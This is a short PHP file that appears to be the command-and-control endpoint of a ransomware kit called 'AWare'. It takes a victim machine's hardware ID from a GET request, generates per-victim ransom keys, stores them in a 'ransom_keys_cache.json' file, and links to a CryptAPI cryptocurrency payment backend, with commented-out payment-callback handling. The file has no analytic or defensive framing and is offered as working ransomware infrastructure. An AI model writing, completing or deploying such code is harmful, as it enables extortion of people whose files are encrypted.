<?php

require_once 'inc/bootstrap.php';

$AWare = new AWare(new CryptAPI());

$AWare->DefineJsonCachePaths('temp/cache.json', 'temp/ransom_keys_cache.json');

if (isset($_GET['HWID_PC']))
{
    $AWare->GenerateVictimRansomKeys($_GET['HWID_PC']);
}

// if (isset($_GET['HWID_PC']))
// {
//     $Aware = new AWare('temp/cache.json', 'temp/ransom_keys_cache.json');
//     $Aware->GenerateVictimRansomKeys($_GET['HWID_PC']);
// }

// if (!CryptAPI\CryptAPI::process_callback($_GET, $Arrays))
// {
//     ExitMessage('Invalid GET Parameters');
// }